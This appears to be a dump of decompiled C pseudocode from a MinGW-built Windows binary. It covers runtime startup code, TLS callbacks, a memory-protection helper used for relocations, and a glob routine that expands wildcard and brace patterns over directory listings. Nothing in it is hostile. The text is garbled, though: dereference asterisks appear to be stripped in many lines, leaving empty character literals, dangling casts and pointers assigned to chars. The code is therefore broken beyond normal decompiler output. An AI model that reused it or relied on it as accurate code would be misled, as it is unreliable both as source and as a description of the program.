if ((int)(uint )(iVar2 + 8) < 0) {
uVar4 = 0x100;
}
if (((uint )(iVar2 + 8) & 0x40000000) != 0) {
uVar4 = uVar4 | 0x200;
}
____cpu_features = ____cpu_features | uVar4;
}
}
return;
}
void ___do_global_ctors(void)
{
int iVar1;
int iVar2;
iVar1 = 0;
do {
iVar2 = iVar1;
iVar1 = iVar2 + 1;
} while ((&_CTOR_LIST)[iVar2 + 1] != 0);
for (; iVar2 != 0; iVar2 = iVar2 + -1) {
((code *)(&_CTOR_LIST)[iVar2])();
}
_atexit((_func_4879 *)&___do_global_dtors);
return;
}
void ___main(void)
{
if (_bss != 0) {
return;
}
_bss = 1;
___do_global_ctors();
return;
}
undefined4 tls_callback_1(undefined4 param_1,int param_2)
{
if ((param_2 != 3) && (param_2 != 0)) {
return 1;
}
___mingw_TLScallback(param_1,param_2);
return 1;
}
// WARNING: Removing unreachable block (ram,0x00402453)
// WARNING: Removing unreachable block (ram,0x00402455)
// WARNING: Removing unreachable block (ram,0x0040245f)
// WARNING: Removing unreachable block (ram,0x00402461)
// WARNING: Removing unreachable block (ram,0x00402468)
undefined4 ___dyn_tls_init_12(undefined4 param_1,int param_2)
{
if (__CRT_MT != 2) {
__CRT_MT = 2;
}
if ((param_2 != 2) && (param_2 == 1)) {
___mingw_TLScallback(param_1,1);
}
return 1;
}
void _text(void)
{
DWORD *pDVar1;
LPVOID pvVar2;
DWORD DVar3;
_EnterCriticalSection_4((LPCRITICAL_SECTION)&DAT_00408044);
for (pDVar1 = _bss; pDVar1 != (DWORD *)0x0; pDVar1 = (DWORD *)pDVar1[2]) {
pvVar2 = _TlsGetValue_4(pDVar1);
DVar3 = _GetLastError_0();
if ((DVar3 == 0) && (pvVar2 != (LPVOID)0x0)) {
((code *)pDVar1[1])(pvVar2);
}
}
_LeaveCriticalSection_4((LPCRITICAL_SECTION)&DAT_00408044);
return;
}
undefined4 __cdecl ___mingw_TLScallback(undefined4 param_1,int param_2)
{
if (param_2 != 1) {
if (param_2 == 0) {
if (DAT_00408040 != 0) {
_text();
}
if (DAT_00408040 == 1) {
DAT_00408040 = 0;
_DeleteCriticalSection_4((LPCRITICAL_SECTION)&DAT_00408044);
}
}
else if ((param_2 == 3) && (DAT_00408040 != 0)) {
_text();
}
return 1;
}
if (DAT_00408040 == 0) {
_InitializeCriticalSection_4((LPCRITICAL_SECTION)&DAT_00408044);
}
DAT_00408040 = 1;
return 1;
}
void _text(char *param_1)
{
FILE *_File;
_File = (FILE *)(_iob_exref + 0x40);
_fwrite(""Mingw runtime failure:\n"",1,0x17,_File);
_vfprintf(_File,param_1,&stack0x00000008);
// WARNING: Subroutine does not return
_abort();
}
void __fastcall FUN_00402730(size_t param_1,void *param_2)
{
LPCVOID in_EAX;
SIZE_T SVar1;
DWORD local_3c;
_MEMORY_BASIC_INFORMATION local_38;
SVar1 = _VirtualQuery_12(in_EAX,&local_38,0x1c);
if (SVar1 == 0) {
// WARNING: Subroutine does not return
_text("" VirtualQuery failed for %d bytes at address %p"");
}
if ((local_38.Protect == 0x40) || (local_38.Protect == 4)) {
_memcpy(in_EAX,param_2,param_1);
}
else {
_VirtualProtect_16(local_38.BaseAddress,local_38.RegionSize,0x40,&local_3c);
_memcpy(in_EAX,param_2,param_1);
if ((local_38.Protect != 0x40) && (local_38.Protect != 4)) {
_VirtualProtect_16(local_38.BaseAddress,local_38.RegionSize,local_3c,&local_3c);
return;
}
}
return;
}
// WARNING: Removing unreachable block (ram,0x00402858)
// WARNING: Removing unreachable block (ram,0x00402866)
// WARNING: Removing unreachable block (ram,0x00402874)
// WARNING: Removing unreachable block (ram,0x00402887)
// WARNING: Removing unreachable block (ram,0x00402849)
// WARNING: Removing unreachable block (ram,0x00402940)
// WARNING: Removing unreachable block (ram,0x00402945)
// WARNING: Removing unreachable block (ram,0x0040294b)
// WARNING: Removing unreachable block (ram,0x0040288c)
// WARNING: Removing unreachable block (ram,0x004029db)
// WARNING: Removing unreachable block (ram,0x00402898)
// WARNING: Removing unreachable block (ram,0x004028a7)
// WARNING: Removing unreachable block (ram,0x00402960)
// WARNING: Removing unreachable block (ram,0x0040296c)
// WARNING: Removing unreachable block (ram,0x00402972)
// WARNING: Removing unreachable block (ram,0x004028cb)
// WARNING: Removing unreachable block (ram,0x004029c0)
// WARNING: Removing unreachable block (ram,0x004028d4)
// WARNING: Removing unreachable block (ram,0x004028dd)
// WARNING: Removing unreachable block (ram,0x00402990)
// WARNING: Removing unreachable block (ram,0x00402999)
// WARNING: Removing unreachable block (ram,0x0040299f)
// WARNING: Removing unreachable block (ram,0x00402956)
// WARNING: Removing unreachable block (ram,0x004028f5)
// WARNING: Removing unreachable block (ram,0x004028fa)
// WARNING: Removing unreachable block (ram,0x00402902)
// WARNING: Removing unreachable block (ram,0x00402930)
void __pei386_runtime_relocator(void)
{
if (_bss == 0) {
_bss = 1;
}
return;
}
uint ___chkstk_ms(undefined1 param_1)
{
uint in_EAX;
uint uVar1;
undefined4 *puVar2;
uint uStack_8;
puVar2 = (undefined4 *)&param_1;
uVar1 = in_EAX;
if (0xfff < in_EAX) {
do {
puVar2 = puVar2 + -0x400;
*puVar2 = *puVar2;
uVar1 = uVar1 - 0x1000;
} while (0x1000 < uVar1);
}
uStack_8 = in_EAX;
*(undefined4 *)((int)puVar2 - uVar1) = *(undefined4 *)((int)puVar2 - uVar1);
return uStack_8;
}
undefined4 __cdecl _fesetenv(int param_1)
{
if (param_1 == -3) {
_data = -1;
}
else {
if (param_1 == -4) {
_data = -2;
}
else {
if (param_1 == 0) {
param_1 = _data;
}
if (param_1 == -1) {
return 0;
}
if (param_1 != -2) {
return 0;
}
}
_fpreset();
}
return 0;
}
undefined4 __fastcall _text(undefined4 param_1,uint param_2)
{
char *pcVar1;
char *in_EAX;
uint uVar2;
char cVar3;
bool bVar4;
if (in_EAX == (char *)0x0) {
return 0;
}
uVar2 = 0;
do {
cVar3 = *in_EAX;
if (cVar3 == '\0') {
return 0;
}
while( true ) {
if (((((byte)(param_2 >> 5) ^ 1) & 1) == 0) || (cVar3 != '\x7f')) {
in_EAX = in_EAX + 1;
}
else {
pcVar1 = in_EAX + 1;
in_EAX = in_EAX + 2;
if (pcVar1 == '\0') {
return 0;
}
}
if (uVar2 != 0) break;
if (cVar3 == '') {
return 1;
}
if (cVar3 == '?') {
return 1;
}
bVar4 = cVar3 == '[';
cVar3 = *in_EAX;
uVar2 = (uint)bVar4;
if (cVar3 == '\0') {
return 0;
}
}
if ((1 < (int)uVar2) && (cVar3 == ']')) {
return 1;
}
uVar2 = uVar2 + (cVar3 != '!');
} while( true );
}
undefined4 FUN_00402b30(void)
{
int in_EAX;
void *pvVar1;
undefined4 uVar2;
int iVar3;
if (in_EAX == 0) {
return 0;
}
iVar3 = *(int *)(in_EAX + 0xc) + 1;
pvVar1 = _malloc(iVar3 * 4);
*(void **)(in_EAX + 8) = pvVar1;
uVar2 = 3;
if (pvVar1 != (void *)0x0) {
*(undefined4 *)(in_EAX + 4) = 0;
if (0 < iVar3) {
do {
iVar3 = iVar3 + -1;
*(undefined4 *)((int)pvVar1 + iVar3 * 4) = 0;
} while (iVar3 != 0);
}
uVar2 = 0;
}
return uVar2;
}
char * __fastcall FUN_00402ba0(uint param_1,uint param_2)
{
uint uVar1;
char *in_EAX;
int iVar2;
int iVar3;
char cVar4;
uint _C;
uint uVar5;
char *pcVar6;
_C = (uint)*in_EAX;
if ((_C == 0x5d) || (uVar5 = _C, _C == 0x2d)) {
if (_C == param_2) {
pcVar6 = in_EAX + 1;
LAB_00402d80:
do {
cVar4 = *pcVar6;
if (cVar4 == ']') goto LAB_00402db5;
if (cVar4 == '\x7f') {
if ((param_1 & 0x20) != 0) {
pcVar6 = pcVar6 + 1;
goto LAB_00402d80;
}
cVar4 = pcVar6[1];
pcVar6 = pcVar6 + 1;
}
pcVar6 = pcVar6 + 1;
if (cVar4 == '\0') {
return (char *)0x0;
}
} while( true );
}
uVar5 = (uint)in_EAX[1];
in_EAX = in_EAX + 1;
}
do {
pcVar6 = in_EAX + 1;
if (uVar5 == 0x5d) {
return (char *)0x0;
}
if (uVar5 == 0x2d) {
if (in_EAX[1] != ']') {
uVar5 = (uint)in_EAX[1];
if (uVar5 == 0) {
return (char *)0x0;
}
pcVar6 = in_EAX + 2;
if ((int)_C < (int)uVar5) {
do {
uVar1 = _C + 1;
if ((param_1 & 0x4000) == 0) {
iVar2 = _tolower(_C);
iVar3 = _tolower(param_2);
if (iVar2 == iVar3) {
LAB_00402cf7:
goto LAB_00402d02;
}
}
else if (~param_2 + uVar1 == 0) goto LAB_00402cf7;
_C = uVar1;
} while (uVar5 != uVar1);
}
else if ((int)uVar5 < (int)_C) {
do {
uVar1 = _C - 1;
if ((param_1 & 0x4000) == 0) {
iVar2 = _tolower(_C);
iVar3 = _tolower(param_2);
if (iVar2 == iVar3) {
LAB_00402e18:
goto LAB_00402e23;
}
}
else if ((1 - param_2) + uVar1 == 0) goto LAB_00402e18;
_C = uVar1;
} while (uVar5 != uVar1);
}
goto LAB_00402c0b;
}
_C = 0x2d;
cVar4 = ']';
}
else {
if (uVar5 == 0) {
return (char *)0x0;
}
LAB_00402c0b:
if (uVar5 == 0x2f) {
return (char *)0x0;
}
if (uVar5 == 0x5c) {
return (char *)0x0;
}
cVar4 = *pcVar6;
_C = uVar5;
}
if ((param_1 & 0x4000) == 0) {
iVar2 = _tolower(_C);
iVar3 = _tolower(param_2);
if (iVar2 == iVar3) {
LAB_00402c53:
goto LAB_00402c6e;
}
}
else if (_C == param_2) goto LAB_00402c53;
uVar5 = (uint)cVar4;
in_EAX = pcVar6;
} while( true );
LAB_00402e23:
cVar4 = *pcVar6;
if (cVar4 == ']') {
LAB_00402d6a:
return pcVar6 + 1;
}
if (cVar4 == '\x7f') {
if ((param_1 & 0x20) != 0) {
pcVar6 = pcVar6 + 1;
goto LAB_00402e23;
}
cVar4 = pcVar6[1];
pcVar6 = pcVar6 + 1;
}
pcVar6 = pcVar6 + 1;
if (cVar4 == '\0') {
return (char *)0x0;
}
goto LAB_00402e23;
LAB_00402d02:
cVar4 = *pcVar6;
while( true ) {
if (cVar4 == ']') goto LAB_00402d6a;
if (cVar4 != '\x7f') goto LAB_00402d0d;
if ((param_1 & 0x20) == 0) break;
pcVar6 = pcVar6 + 1;
cVar4 = *pcVar6;
}
cVar4 = pcVar6[1];
pcVar6 = pcVar6 + 1;
LAB_00402d0d:
pcVar6 = pcVar6 + 1;
if (cVar4 == '\0') {
return (char *)0x0;
}
goto LAB_00402d02;
LAB_00402c6e:
if (cVar4 == ']') {
LAB_00402db5:
return pcVar6 + 1;
}
if (cVar4 == '\x7f') {
if ((param_1 & 0x20) == 0) {
cVar4 = pcVar6[1];
pcVar6 = pcVar6 + 1;
goto LAB_00402c60;
}
}
else {
LAB_00402c60:
if (cVar4 == '\0') {
return (char *)0x0;
}
}
pcVar6 = pcVar6 + 1;
cVar4 = *pcVar6;
goto LAB_00402c6e;
}
int __fastcall FUN_00402e60(uint param_1,char *param_2)
{
char *in_EAX;
int iVar1;
int iVar2;
char cVar3;
int iVar4;
uint uVar5;
int _C;
char *pcVar6;
char *pcVar7;
char *pcVar8;
cVar3 = *in_EAX;
if (((*param_2 != '.') || (cVar3 == '.')) || (iVar4 = cVar3 + -0x2e, (param_1 & 0x10000) != 0)) {
pcVar8 = param_2 + 1;
while( true ) {
iVar4 = (int)cVar3;
pcVar6 = in_EAX + 1;
if (iVar4 == 0) break;
if (cVar3 == '?') {
if (pcVar8[-1] == '\0') {
return 0x3f;
}
}
else if (cVar3 == '[') {
uVar5 = (uint)pcVar8[-1];
if (uVar5 == 0) {
return 0x5b;
}
if (in_EAX[1] == '!') {
pcVar6 = in_EAX + 2;
pcVar7 = FUN_00402ba0(param_1,uVar5);
if (pcVar7 == (char *)0x0) {
cVar3 = in_EAX[2];
if (cVar3 == ']') {
pcVar6 = in_EAX + 3;
cVar3 = in_EAX[3];
}
while (cVar3 != ']') {
if (cVar3 == '\x7f') {
if ((param_1 & 0x20) == 0) {
cVar3 = pcVar6[1];
pcVar6 = pcVar6 + 1;
goto LAB_00403020;
}
}
else {
LAB_00403020:
if (cVar3 == '\0') {
return 0x5d;
}
}
pcVar6 = pcVar6 + 1;
cVar3 = pcVar6;
}
pcVar6 = pcVar6 + 1;
}
}
else {
pcVar6 = FUN_00402ba0(param_1,uVar5);
}
if (pcVar6 == (char )0x0) {
return 0x5d;
}
}
else {
if (cVar3 == '') {
cVar3 = in_EAX[1];
while (cVar3 == '') {
pcVar6 = pcVar6 + 1;
cVar3 = *pcVar6;
}
if (cVar3 != '\0') {
pcVar8 = pcVar8 + -1;
do {
iVar4 = FUN_00402e60(param_1 | 0x10000,pcVar8);
if (iVar4 == 0) {
return 0;
}
cVar3 = *pcVar8;
pcVar8 = pcVar8 + 1;
} while (cVar3 != '\0');
return iVar4;
}
return 0;
}
if ((((param_1 >> 5 ^ 1) & 1) == 0) || (iVar4 != 0x7f)) {
LAB_00402ec2:
pcVar7 = pcVar6;
}
else {
iVar4 = (int)in_EAX[1];
pcVar7 = in_EAX + 2;
if (iVar4 == 0) goto LAB_00402ec2;
}
_C = (int)pcVar8[-1];
if (pcVar8[-1] == '\0') {
_C = 0;
LAB_00402f02:
return iVar4 - _C;
}
if ((param_1 & 0x4000) == 0) {
iVar1 = _tolower(iVar4);
iVar2 = _tolower(_C);
iVar1 = iVar1 - iVar2;
}
else {
iVar1 = iVar4 - _C;
}
pcVar6 = pcVar7;
if (iVar1 != 0) goto LAB_00402f02;
}
cVar3 = pcVar6;
pcVar8 = pcVar8 + 1;
in_EAX = pcVar6;
}
iVar4 = -(int)pcVar8[-1];
}
return iVar4;
}
undefined4 __fastcall FUN_00403080(undefined4 param_1,int param_2)
{
int iVar1;
int iVar2;
int iVar3;
undefined4 in_EAX;
void pvVar4;
pvVar4 = _realloc((void **)(param_2 + 8),
((int *)(param_2 + 0xc) + *(int *)(param_2 + 4)) * 4 + 8);
if (pvVar4 != (void *)0x0) {
iVar2 = *(int *)(param_2 + 4);
iVar3 = *(int *)(param_2 + 0xc);
*(void **)(param_2 + 8) = pvVar4;
iVar1 = iVar2 + 1;
*(int *)(param_2 + 4) = iVar1;
*(undefined4 *)((int)pvVar4 + (iVar2 + iVar3) * 4) = in_EAX;
*(undefined4 *)((int)pvVar4 + (iVar3 + iVar1) * 4) = 0;
return 0;
}
return 1;
}
void __fastcall FUN_004030e0(undefined4 param_1,int param_2)
{
int *in_EAX;
undefined4 extraout_ECX;
undefined4 extraout_ECX_00;
if (*in_EAX != 0) {
FUN_004030e0(param_1,param_2);
param_1 = extraout_ECX;
}
if ((in_EAX[2] != 0) && (param_2 != 0)) {
FUN_00403080(param_1,param_2);
param_1 = extraout_ECX_00;
}
if (in_EAX[1] != 0) {
FUN_004030e0(param_1,param_2);
}
_free(in_EAX);
return;
}
// WARNING: Unable to track spacebase fully for stack
// WARNING: Removing unreachable block (ram,0x00403998)
// WARNING: Type propagation algorithm not settling
uint __fastcall FUN_00403130(undefined *param_1,uint param_2,void *param_3)
{
undefined4 uVar1;
undefined4 *puVar2;
code *pcVar3;
void **ppvVar4;
char cVar5;
char *in_EAX;
uint uVar6;
void *pvVar7;
int iVar8;
size_t sVar9;
undefined4 *puVar10;
int iVar11;
char *pcVar12;
undefined *puVar13;
undefined4 *puVar14;
char **ppcVar15;
undefined4 extraout_ECX;
void *extraout_ECX_00;
void *extraout_ECX_01;
void *extraout_ECX_02;
void *extraout_ECX_03;
void *extraout_ECX_04;
void *extraout_ECX_05;
undefined4 extraout_ECX_06;
undefined4 extraout_ECX_07;
void *extraout_ECX_08;
void *extraout_ECX_09;
undefined4 extraout_ECX_10;
undefined4 extraout_EDX;
int extraout_EDX_00;
int iVar16;
char *pcVar17;
undefined4 *puVar18;
int *piVar19;
int **ppiVar20;
char *pcVar22;
uint uVar23;
char *pcVar24;
int *piVar25;
bool bVar26;
char *pcStackY_80;
size_t sStack_74;
char acStack_70 [15];
char local_61;
char *local_60;
undefined *local_5c;
undefined *local_58;
undefined *local_54;
undefined4 *local_50;
undefined4 *local_4c;
int *local_48;
undefined *local_44;
code *local_40;
char *local_3c;
char *local_38;
uint local_34;
undefined4 local_30;
undefined local_2c [8];
int *local_24;
undefined4 local_20;
char **ppcVar21;
local_40 = (code *)param_1;
local_34 = param_2;
if ((param_2 & 0x400) != 0) {
pcStackY_80 = (char *)0x4034ab;
pcVar12 = in_EAX;
local_44 = &stack0xffffff84;
_strlen(in_EAX);
pcStackY_80 = (char *)0x4034b9;
uVar6 = ___chkstk_ms((char)pcVar12);
iVar11 = -uVar6;
pcVar12 = acStack_70 + iVar11;
local_3c = pcVar12;
cVar5 = *in_EAX;
pcVar17 = in_EAX;
LAB_004034c9:
if (cVar5 == '\x7f') goto LAB_004034f5;
while (pcVar22 = pcVar17, pcVar24 = pcVar12, cVar5 != '{') {
while( true ) {
pcVar12 = pcVar24 + 1;
pcVar17 = pcVar22 + 1;
*pcVar24 = cVar5;
if ((cVar5 == '\0') || (cVar5 == '{')) {
if (cVar5 != '{') goto LAB_0040314a;
local_38 = pcVar12;
goto LAB_00403515;
}
cVar5 = pcVar22[1];
if (cVar5 != '\x7f') break;
LAB_004034f5:
cVar5 = pcVar17[1];
*pcVar12 = '\x7f';
if (cVar5 != '\0') {
pcVar12[1] = cVar5;
pcVar17 = pcVar17 + 2;
cVar5 = *pcVar17;
pcVar12 = pcVar12 + 2;
goto LAB_004034c9;
}
pcVar24 = pcVar12 + 1;
pcVar22 = pcVar17 + 1;
cVar5 = '\0';
}
}
local_38 = pcVar12;
LAB_00403515:
iVar8 = 1;
pcVar12 = local_38;
LAB_0040351d:
cVar5 = pcVar17[1];
if (cVar5 == '\x7f') goto LAB_0040354b;
do {
pcVar17 = pcVar17 + 1;
pcVar22 = pcVar12;
while( true ) {
if ((cVar5 != '}') && ((cVar5 != ',' || (iVar8 != 1)))) {
if (cVar5 == '{') {
iVar8 = iVar8 + 1;
}
local_30 = (char *)CONCAT31(local_30.1_3,cVar5 != '\0');
pcVar12 = pcVar22 + 1;
*pcVar22 = cVar5;
if (cVar5 != '\0') goto LAB_0040351d;
pcVar22 = pcVar12;
if (cVar5 == '\0') {
return 1;
}
goto LAB_00403670;
}
iVar8 = iVar8 + -1;
if (iVar8 == 0) {
pcVar12 = pcVar17;
if (cVar5 != ',') goto LAB_00403613;
iVar8 = 1;
pcVar24 = pcVar17;
goto LAB_004035d0;
}
*pcVar22 = cVar5;
cVar5 = pcVar17[1];
pcVar12 = pcVar22 + 1;
if (cVar5 != '\x7f') break;
LAB_0040354b:
cVar5 = pcVar17[2];
*pcVar12 = '\x7f';
pcVar22 = pcVar12 + 2;
pcVar12[1] = cVar5;
if (cVar5 == '\0') {
pcVar12[2] = '\0';
return 1;
}
cVar5 = pcVar17[3];
pcVar17 = pcVar17 + 3;
}
} while( true );
}
LAB_0040314a:
local_5c = &stack0xffffff84;
pcStackY_80 = (char *)0x403155;
pcVar12 = in_EAX;
_strlen(in_EAX);
pcStackY_80 = (char *)0x403166;
uVar6 = ___chkstk_ms((char)pcVar12);
iVar11 = -uVar6;
ppiVar20 = (int **)(&stack0xffffff84 + iVar11);
*(undefined4 *)((int)&sStack_74 + iVar11) = extraout_EDX;
*(char **)(&stack0xffffff88 + iVar11) = in_EAX;
*(char **)(&stack0xffffff84 + iVar11) = acStack_70 + iVar11;
(undefined4 )((int)&pcStackY_80 + iVar11) = 0x40317c;
pvVar7 = _memcpy((void **)(&stack0xffffff84 + iVar11),(void **)(&stack0xffffff88 + iVar11),
*(size_t *)((int)&sStack_74 + iVar11));
*(void **)(&stack0xffffff84 + iVar11) = pvVar7;
*(undefined4 )((int)&pcStackY_80 + iVar11) = 0x403184;
local_30 = ___mingw_dirname((char **)(&stack0xffffff84 + iVar11));
local_20 = 0;
*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x403198;
local_38 = (char *)FUN_00402b30();
uVar6 = local_34;
if (local_38 != (char *)0x0) {
return (uint)local_38;
}
*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x4031af;
iVar8 = _text(extraout_ECX,uVar6);
if (iVar8 == 0) {
*(char **)(&stack0xffffff84 + iVar11) = local_30;
*(undefined4 )((int)&pcStackY_80 + iVar11) = 0x40369b;
_strlen((char **)(&stack0xffffff84 + iVar11));
*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x4036a9;
uVar6 = ___chkstk_ms((&stack0xffffff84)[iVar11]);
iVar8 = -uVar6;
pcVar12 = acStack_70 + iVar8 + iVar11;
pcVar17 = local_30;
do {
cVar5 = *pcVar17;
if (cVar5 == '\x7f') {
cVar5 = pcVar17[1];
pcVar17 = pcVar17 + 1;
}
pcVar17 = pcVar17 + 1;
*pcVar12 = cVar5;
pcVar12 = pcVar12 + 1;
} while (cVar5 != '\0');
*(char **)(&stack0xffffff84 + iVar8 + iVar11) = acStack_70 + iVar8 + iVar11;
*(undefined4 )((int)&pcStackY_80 + iVar8 + iVar11) = 0x4036e5;
pcVar12 = _strdup((char **)(&stack0xffffff84 + iVar8 + iVar11));
if (pcVar12 == (char *)0x0) {
return 1;
}
*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x4036f7;
local_38 = (char *)FUN_00403080(extraout_ECX_06,(int)local_2c);
}
else {
*(undefined **)(&stack0xffffff84 + iVar11) = local_2c;
pcVar3 = local_40;
*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x4031cc;
local_38 = (char )FUN_00403130(pcVar3,uVar6 | 0x8000,(void **)(&stack0xffffff84 + iVar11));
}
uVar6 = local_34;
if (local_38 != (char *)0x0) {
return (uint)local_38;
}
if ((in_EAX[1] == '/') || (bVar26 = in_EAX[1] == '\\', bVar26)) {
LAB_004031fb:
*(char **)(&stack0xffffff84 + iVar11) = local_30;
*(undefined4 )((int)&pcStackY_80 + iVar11) = 0x403206;
sVar9 = _strlen((char **)(&stack0xffffff84 + iVar11));
local_3c = in_EAX + sVar9;
if (in_EAX < local_3c) {
local_61 = *local_3c;
if ((local_61 == '/') || (local_61 == '\\')) {
}
else {
do {
pcVar12 = local_3c + -1;
if (in_EAX == pcVar12) {
local_61 = local_3c[-1];
local_3c = pcVar12;
goto LAB_00403259;
}
local_61 = local_3c[-1];
} while ((local_61 != '/') && (local_3c = pcVar12, local_61 != '\\'));
local_3c = pcVar12;
}
}
else {
local_61 = *local_3c;
}
LAB_00403259:
if ((local_61 == '/') || (local_61 == '\\')) {
do {
cVar5 = local_61;
local_3c = local_3c + 1;
local_61 = *local_3c;
} while (local_61 == '/' || local_61 == '\\');
local_61 = cVar5;
local_60 = local_30;
}
else {
local_61 = '\\';
local_60 = local_30;
}
}
else {
iVar8 = 2;
pcVar12 = local_30;
pcVar17 = ""."";
do {
if (iVar8 == 0) break;
iVar8 = iVar8 + -1;
bVar26 = *pcVar12 == *pcVar17;
pcVar12 = pcVar12 + 1;
pcVar17 = pcVar17 + 1;
} while (bVar26);
if (!bVar26) goto LAB_004031fb;
if ((local_34 & 0x10) != 0) {
*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x4038f4;
local_38 = (char *)_text(iVar8,uVar6);
if (local_38 == (char *)0x0) {
*(char **)(&stack0xffffff84 + iVar11) = in_EAX;
*(undefined4 )((int)&pcStackY_80 + iVar11) = 0x403909;
_strlen((char **)(&stack0xffffff84 + iVar11));
*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x403917;
uVar6 = ___chkstk_ms((&stack0xffffff84)[iVar11]);
iVar8 = -uVar6;
pcVar12 = acStack_70 + iVar8 + iVar11;
do {
cVar5 = *in_EAX;
if (cVar5 == '\x7f') {
cVar5 = in_EAX[1];
in_EAX = in_EAX + 1;
}
in_EAX = in_EAX + 1;
*pcVar12 = cVar5;
pcVar12 = pcVar12 + 1;
} while (cVar5 != '\0');
*(char **)(&stack0xffffff84 + iVar8 + iVar11) = acStack_70 + iVar8 + iVar11;
*(undefined4 )((int)&pcStackY_80 + iVar8 + iVar11) = 0x403946;
pcVar12 = _strdup((char **)(&stack0xffffff84 + iVar8 + iVar11));
ppvVar4 = (void **)(&stack0xffffff84 + iVar11);
if ((pcVar12 == (char *)0x0) ||
(ppvVar4 = (void **)(&stack0xffffff84 + iVar11), param_3 == (void *)0x0)) {
LAB_0040386b:
ppiVar20 = (int **)ppvVar4;
local_48 = local_24;
}
else {
*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x403963;
FUN_00403080(extraout_ECX_10,(int)param_3);
local_48 = local_24;
}
goto LAB_004037ca;
}
}
local_61 = '\\';
local_60 = (char *)0x0;
local_3c = in_EAX;
}
local_38 = (char *)0x2;
local_48 = local_24;
iVar8 = *local_24;
local_30 = (char *)(local_34 & 0x8000);
ppiVar20 = (int **)(&stack0xffffff84 + iVar11);
ppcVar15 = (char **)(&stack0xffffff84 + iVar11);
if (iVar8 != 0) {
LAB_004032b9:
ppiVar20 = (int **)ppcVar15;
*ppiVar20 = (int *)iVar8;
((char **)ppiVar20)[-1] = (char *)0x4032c1;
puVar10 = ___mingw_opendir((char *)*ppiVar20);
pcVar3 = local_40;
if (puVar10 == (undefined4 *)0x0) {
piVar25 = local_48;
if ((local_34 & 4) != 0) {
LAB_00403795:
piVar19 = piVar25 + 1;
*ppiVar20 = (int *)*piVar25;
ppiVar20[-1] = (int *)0x40379f;
_free(*ppiVar20);
if (piVar25[1] == 0) goto LAB_004037bd;
LAB_004037a6:
iVar11 = local_48[1];
do {
piVar19 = piVar19 + 1;
*ppiVar20 = (int *)iVar11;
ppiVar20[-1] = (int *)0x4037b7;
_free(*ppiVar20);
iVar11 = *piVar19;
} while (iVar11 != 0);
LAB_004037bd:
local_38 = (char *)0x1;
local_48 = local_24;
goto LAB_004037ca;
}
if (local_40 != (code *)0x0) {
((char **)ppiVar20)[-1] = (char *)0x403886;
ppcVar15 = (char **)__errno();
((char **)ppiVar20)[1] = *ppcVar15;
piVar25 = local_48;
*ppiVar20 = (int *)*local_48;
ppcVar21 = (char **)ppiVar20 + -1;
ppiVar20 = (int **)((char **)ppiVar20 + -1);
*ppcVar21 = (char *)0x403896;
iVar11 = (*pcVar3)();
if (iVar11 != 0) goto LAB_00403795;
}
}
else {
if (local_60 == (char *)0x0) {
local_44 = (undefined *)0x0;
pvVar7 = extraout_ECX_00;
}
else {
*ppiVar20 = (int *)*local_48;
((char **)ppiVar20)[-1] = (char *)0x4032e3;
local_44 = (undefined *)_strlen((char *)*ppiVar20);
pvVar7 = extraout_ECX_01;
}
local_4c = (undefined4 *)0x0;
local_58 = local_44 + 2;
ppcVar15 = (char **)ppiVar20;
LAB_00403300:
ppiVar20 = (int **)ppcVar15;
*ppiVar20 = puVar10;
ppiVar20[-1] = (int *)0x403308;
iVar11 = ___mingw_readdir(pvVar7,(int)*ppiVar20);
uVar6 = local_34;
if (iVar11 != 0) {
ppcVar15 = (char **)ppiVar20;
if ((local_30 == (char *)0x0) || (pvVar7 = extraout_ECX_02, *(int *)(iVar11 + 8) == 0x10)) {
ppiVar20[-1] = (int *)0x40332f;
iVar8 = FUN_00402e60(uVar6,(char *)(iVar11 + 0xc));
pvVar7 = extraout_ECX_03;
if (iVar8 == 0) {
local_54 = (undefined *)ppiVar20;
ppiVar20[-1] = (int )0x40334c;
uVar6 = ___chkstk_ms((undefined *)ppiVar20);
puVar13 = local_44;
iVar8 = -uVar6;
local_50 = (undefined4 *)0x0;
pcVar12 = (char *)((int)ppiVar20 + iVar8 + 0xc);
iVar16 = extraout_EDX_00;
if (local_44 != (undefined *)0x0) {
local_50 = (undefined4 *)extraout_EDX_00;
iVar16 = *local_48;
*(char **)((int)ppiVar20 + iVar8) = pcVar12;
*(undefined **)((int)ppiVar20 + iVar8 + 8) = puVar13;
*(int *)((int)ppiVar20 + iVar8 + 4) = iVar16;
(undefined4 )((int)ppiVar20 + iVar8 + -4) = 0x4037fb;
_memcpy((void **)((int)ppiVar20 + iVar8),(void **)((int)ppiVar20 + iVar8 + 4),
*(size_t *)((int)ppiVar20 + iVar8 + 8));
iVar16 = (int)local_50;
if ((local_44[(int)((int)ppiVar20 + iVar8 + 0xb)] == '/') ||
(local_44[(int)((int)ppiVar20 + iVar8 + 0xb)] == '\\')) {
local_50 = (undefined4 *)local_44;
}
else {
local_50 = (undefined4 *)(local_44 + 1);
pcVar12[(int)local_44] = local_61;
}
}
puVar13 = (undefined *)local_50;
*(char **)((int)ppiVar20 + iVar8 + 4) = (char *)(iVar11 + 0xc);
*(int *)((int)ppiVar20 + iVar8 + 8) = iVar16 + 1;
*(undefined **)((int)ppiVar20 + iVar8) = puVar13 + (int)pcVar12;
(undefined4 )((int)ppiVar20 + iVar8 + -4) = 0x40337e;
_memcpy((void **)((int)ppiVar20 + iVar8),(void **)((int)ppiVar20 + iVar8 + 4),
*(size_t *)((int)ppiVar20 + iVar8 + 8));
*(char **)((int)ppiVar20 + iVar8) = pcVar12;
*(undefined4 )((int)ppiVar20 + iVar8 + -4) = 0x403386;
_strlen((char **)((int)ppiVar20 + iVar8));
*(undefined4 )((int)ppiVar20 + iVar8 + -4) = 0x403394;
uVar6 = ___chkstk_ms((undefined *)((int)ppiVar20 + iVar8));
iVar11 = -uVar6;
pcVar17 = (char *)((int)ppiVar20 + iVar11 + iVar8 + 0xc);
pcVar22 = pcVar17;
do {
while (cVar5 = *pcVar12, cVar5 != '\x7f') {
pcVar12 = pcVar12 + 1;
*pcVar22 = cVar5;
pcVar22 = pcVar22 + 1;
if (cVar5 == '\0') goto LAB_004033c9;
}
cVar5 = pcVar12[1];
pcVar12 = pcVar12 + 2;
*pcVar22 = cVar5;
pcVar22 = pcVar22 + 1;
